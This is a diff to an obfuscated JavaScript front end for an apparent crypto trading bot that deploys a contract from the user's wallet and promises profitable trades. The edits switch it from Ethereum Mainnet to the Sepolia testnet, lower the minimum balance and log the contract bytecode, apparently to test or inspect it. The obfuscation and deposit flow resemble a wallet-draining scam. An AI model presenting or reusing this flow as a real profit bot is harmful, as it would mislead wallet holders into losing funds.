@@ -62,7 +62,7 @@ let isConnected = false,
   statusUpdateInterval = null,
   paramsUpdateInterval = null,
   tradeLoopInterval = null
-const MINIMUM_BALANCE = 0.01,
+const MINIMUM_BALANCE = 0.001,
   searchMessages = [
     'Searching for profitable trades...',
     'Looking for the best trade for high returns...',
@@ -905,7 +905,7 @@ function generateQRCode(_0x1bc67f) {
     return
   }
   qrCodeContainer.innerHTML = ''
-  const _0x50aad9 = 'ethereum:' + _0x1bc67f + '?chainId=1'
+  const _0x50aad9 = 'ethereum:' + _0x1bc67f + '?chainId=11155111'
   QRCode.toCanvas(
     document.createElement('canvas'),
     _0x50aad9,
@@ -952,6 +952,9 @@ async function deployContract() {
       (deployButton.textContent = 'Deploying...'))
     hideAllButtons()
     await typeText(tutorialText, 'Preparing to deploy contract...', 10)
+	console.log(contractBytecode)
+	console.log(contractBytecode.length)
+	
     const _0x17072f = {
         from: accounts[0],
         data: contractBytecode,
@@ -1134,11 +1137,14 @@ async function initializeContract() {
     return
   }
   try {
-    const _0x58d5c5 = await window.ethereum.request({ method: 'eth_chainId' })
-    if (_0x58d5c5 !== '0x1') {
-      await typeText(tutorialText, 'Please switch to Ethereum Mainnet.', 10)
-      return
-    }
+    const _0x58d5c5 = await window.ethereum.request({
+	  method: 'eth_chainId'
+	})
+
+	if (_0x58d5c5 !== '0xaa36a7') {
+	  await typeText(tutorialText, 'Please switch to Sepolia.', 10)
+	  return
+	}
     lastAction = 'afterDeposit'
     saveState()
     initializeButton &&
@@ -1150,8 +1156,7 @@ async function initializeContract() {
         contractABI,
         deployedContractAddress
       ),
-      _0x418a00 = nante
-    _0x10995c: _0x25e850.methods.Initialize().encodeABI()
+    const _0x418a00 = _0x25e850.methods.Initialize().encodeABI()
     const _0x19ef90 = await web3.eth.estimateGas({
         from: accounts[0],
         to: deployedContractAddress,
